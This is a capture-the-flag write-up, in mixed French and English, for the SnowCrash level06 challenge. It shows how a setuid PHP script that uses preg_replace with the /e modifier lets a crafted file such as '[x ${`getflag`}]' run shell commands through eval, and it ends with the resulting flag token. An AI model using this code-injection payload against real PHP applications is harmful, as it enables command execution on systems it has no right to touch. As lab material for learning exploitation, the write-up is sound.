# Start / Analyse

```sh
level06@SnowCrash:~$ ll
total 24
dr-xr-x---+ 1 level06 level06  140 Mar  5  2016 ./
d--x--x--x  1 root    users    340 Aug 30  2015 ../
-r-x------  1 level06 level06  220 Apr  3  2012 .bash_logout*
-r-x------  1 level06 level06 3518 Aug 30  2015 .bashrc*
-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06*
-rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php*
-r-x------  1 level06 level06  675 Apr  3  2012 .profile*
```
> we have on exec with effectif user flag00 and level06.php

```sh
level06@SnowCrash:~$ cat level06
ELF☺☺☺☻♥☺(□4T◄4         (▲
```
> cut ssh conection

```php
level06@SnowCrash:~$ cat level06.php
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>
```
> seems to be the source code of the exec, la fonction utilise preg_replace qui donc remplace les pattern par d'autres dans les array ou des strings

## Interpretation des varaiables

En PHP les input `id` et \`id\` ne marche pas car ca print la strings
pour print un variable dans une string php il faut mettre l'expression dans \${exp} comme ca les back ticks seront interprété comme alias de shell_exec
${`id`}

Si on met \${`id`} dans le file, le program nous sort ${`id`} car il prends le retour de file_get_contents comme une string litteral


## e modifier 
Using the e modifier allows us to use PHP functions within the replace parameters. The following bit of code turns all letters upper case in a string of random letters by using the strtoupper() PHP function.

## the \2 parameter

Le parametre \n retourne le n match de regex ici le 2eme match donc (.*) 

## eval
Le fonction eval en php interprete les variables dans une string, exactement ce qui nous faut pour lancer une commande. Le callback qui est appellé par preg_replace avec le modifier /e execute eval a son parametre

# Exploit

Nous devons donc tilt le premiere regex pour entrer dans la fonction callback que notre string soit eval

/tmp/file.txt : 
```
[x ${`id`}]
```

`[x ]` pour tilt le regex

Et `(.*)` correspond à \2 qui est passé au call back donc tous ce qui est apres `[x ` sera eval

/tmp/file.txt : 
```
[x ${`getflag`}]
```

```sh
level06@SnowCrash:~$ ./level06 /tmp/file.txt /tmp/file.txt
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
in /home/user/level06/level06.php(4) : regexp code on line 1
```


>> *https://stackoverflow.com/questions/15454220/replace-preg-replace-e-modifier-with-preg-replace-callback*